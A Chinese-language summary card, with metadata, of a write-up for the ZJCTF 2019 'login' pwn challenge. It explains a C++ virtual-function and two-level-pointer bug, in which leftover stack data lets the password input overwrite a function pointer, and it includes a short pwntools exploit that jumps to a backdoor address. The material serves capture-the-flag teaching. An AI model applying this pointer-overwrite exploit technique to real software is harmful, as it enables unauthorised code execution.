---
title: pwn 题 ZJCTF 2019 login 的分析
contest: ZJCTF
year: 2019
difficulty: hard
vuln_type: pwn_unknown
tags: [cpp-vtable, virtual-function, function-pointer, two-level-pointer, asn-stack-overflow, password-backdoor, gdb-trace]
attack_chain:
  - C++ User/Admin 结构体
  - 虚函数表 + 虚函数指针
  - main 函数 user->read_name 0x49 字节
  - 覆盖 password_checker 二级指针
  - 写后门函数 0x400e88 地址
  - 触发 password 验证流程
  - 二级指针调用跳到后门
key_payload: C++ 二级虚函数指针 + 栈平移覆盖
one_liner: ZJCTF 2019 login PWN 复盘，C++ 虚函数表 + 二级指针调用 + 栈子函数复用覆盖。
lesson: '父子函数栈平移时，子函数栈空间的指针变量可能被父函数新调用破坏。'
quality: high
---

ZJCTF 2019 login PWN 完整复盘（来源 ctfiot，作者 N1co5in3 看雪论坛）。

**题目结构**
- C++ 类 User/Admin，都有 `get_password` 虚函数指针
- Admin 结构体有 `0x401150` 函数指针（实际无意义）
- main 函数：read_name 0x49 字节 → 写入 bss 段 `login+1`
- 调用 `password_checker` → 通过虚函数表 → 触发 `get_password`
- 后门函数：`0x400e88`

**关键洞**：
1. `User::read_name` 读 0x49 字节写到 bss 段
2. 指针 v3 存储函数指针 `main::{lambda(void)#1}::operator`
3. `password_checker` 用 v3 计算二级指针 v7 = `*(*v3)`
4. 二级指针调用时 rbp-0x18 是关键

**栈子函数复用**（核心洞察）：
> 父函数中存在子函数栈空间的指针变量，下一次调用子函数时这个指针变量指向的值可能改变！

main 的 `[rbp-0x130]` 来自 password_checker 的 rax；rax 来自 `[rbp-0x18]`；二级指针调 `[rbp-0x18]`，**再用 password 输入覆盖 `[rbp-0x18]`**。

**Exp**
```python
from pwn import *
context.log_level = 'debug'
io = process('./login')
io.sendlineafter('username: ', 'admin')
payload = b'2jctf_pa5sw0rd\x00'.ljust(0x48, b'a') + p64(0x400e88)
io.sendafter('password', payload)
io.interactive()
```

**关键技巧**：
- C++ 虚函数表是 `struct + vfptr` 二级指针调用
- 子函数 rbp 复用导致指针悬挂
- 后门函数地址覆盖二级指针

**适合**：C++ 虚函数机制 + GDB 汇编级调试 + 二级指针利用的组合教学。
